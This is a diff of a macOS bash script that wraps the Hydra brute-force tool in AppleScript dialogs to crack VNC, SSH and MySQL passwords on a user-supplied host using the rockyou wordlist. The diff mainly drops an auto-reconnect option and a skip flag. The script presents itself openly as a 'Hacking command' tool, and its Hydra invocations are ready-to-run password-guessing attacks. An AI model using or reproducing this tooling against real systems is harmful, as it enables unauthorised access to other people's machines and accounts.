@@ -49,45 +49,23 @@ hostName="Input Hostname:"  # Message for hostname prompt
 command_exists() {
     command -v "$1" >/dev/null 2>&1
 }
-cat output.log
-# Auto-connects the SSH server to the computer
-if [[ "$1" == "--auto" ]]; then
 
-    # Check if the SSH connection file exists
-    if [ -f "${ssh_connection}" ]; then
-        userConnection=$(cat "${ssh_connection}")  # Read the hint from the file
-        ssh "${userConnection}"  # Connect to the SSH server
-    else
-        # File not found
-        echo -e "[ ${RED}${BRIGHT}Error${NC} ] SSH username and IP address file 'connect.log' not found."
-        exit 1
-    fi
+# Loop through required packages and check if they are installed
+for package in "${required_packages[@]}"; do
+    if ! command_exists "${package}"; then
+        # Prompt the user to install missing package
+        osascript -e "display dialog \"The required package '$package' is not installed. Would you like me to install it for you?\" buttons {\"Yes\", \"No\"} default button \"Yes\""
+        choice=$(osascript -e "button returned of result")
 
-    # Exit script successfully
-    exit 1
-fi
-# check if the user has put --skip in the arguemnts 
-if [[ "$1" == "--skip" ]]; then
-    echo "Skipping package check"
-    sleep 4
-else
-    # Loop through required packages and check if they are installed
-    for package in "${required_packages[@]}"; do
-        if ! command_exists "${package}"; then
-            # Prompt the user to install missing package
-            osascript -e "display dialog \"The required package '$package' is not installed. Would you like me to install it for you?\" buttons {\"Yes\", \"No\"} default button \"Yes\""
-            choice=$(osascript -e "button returned of result")
-
-            if [ "$choice" == "Yes" ]; then
-                bash requirements.sh  # Run script to install missing packages
-                exit 1
-            else
-                osascript -e 'display notification "Stopping program due to missing package." with title "Program Stopped"'  # Notify user of program stop
-                exit 1
-            fi
+        if [ "$choice" == "Yes" ]; then
+            bash requirements.sh  # Run script to install missing packages
+            exit 1
+        else
+            osascript -e 'display notification "Stopping program due to missing package." with title "Program Stopped"'  # Notify user of program stop
+            exit 1
         fi
-    done
-fi
+    fi
+done
 
 # Check if the script is run with --help or -h; display help info if true
 if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
@@ -152,9 +130,9 @@ else
             osascript -e 'display notification "Hacking command" with title "To crack VNC(5900), leave Input Username empty. To crack MySQL(3306), type localhost in Input Hostname"'
             
             # Prompt for username
-            user=$(osascript -e "display dialog \"${userName}\" default answer \"\" buttons {\"OK\"} default button \"OK\"" -e 'text returned of result')
+            user=$(osascript -e "display dialog \"$userName\" default answer \"\" buttons {\"OK\"} default button \"OK\"" -e 'text returned of result')
             # Prompt for hostname
-            host=$(osascript -e "display dialog \"${hostName}\" default answer \"\" buttons {\"OK\"} default button \"OK\"" -e 'text returned of result')
+            host=$(osascript -e "display dialog \"$hostName\" default answer \"\" buttons {\"OK\"} default button \"OK\"" -e 'text returned of result')
         }
 
         # Function to crack VNC passwords
@@ -168,7 +146,6 @@ else
                 else
                     # Run Hydra for VNC password cracking
                     hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://"$host"
-                    echo "${user}"  # Display username
                     osascript -e "display notification \"Connecting to ${host}. Please wait...\" with title \"Connecting to VNC Server\""
                     sleep 5  # Simulate waiting time
                     osascript -e "display notification \"Connected to ${host}. Enter the password to continue...\" with title \"VNC Connection\""
@@ -189,7 +166,6 @@ else
                 else
                     # Run Hydra for SSH password cracking
                     hydra -l "$user" -P rockyou.txt -t 64 -vV -o output.log -I ssh://"${host}"
-                    echo "${user}@${host}" > "${ssh_connection}"
                     osascript -e "display notification \"Connecting to ${user}. Please wait...\" with title \"Connecting to SSH Server\""
                     sleep 5  # Simulate waiting time
                     osascript -e "display notification \"Connected to ${user}. Enter the password to continue...\" with title \"SSH Connection\""
